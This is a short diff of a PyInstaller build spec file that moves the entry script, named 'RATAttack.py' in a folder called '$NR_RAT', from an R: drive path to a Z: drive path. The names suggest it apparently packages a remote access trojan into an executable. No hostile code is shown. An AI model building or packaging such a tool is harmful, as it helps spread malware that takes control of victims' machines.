@@ -3,8 +3,8 @@
 block_cipher = None
 
 
-a = Analysis(['R:\\$NR_RAT\\new\\\\RATAttack.py'],
-             pathex=['R:\\$NR_RAT\\new'],
+a = Analysis(['Z:\\\\RATAttack.py'],
+             pathex=['Z:\\'],
              binaries=[],
              datas=[],
              hiddenimports=[],
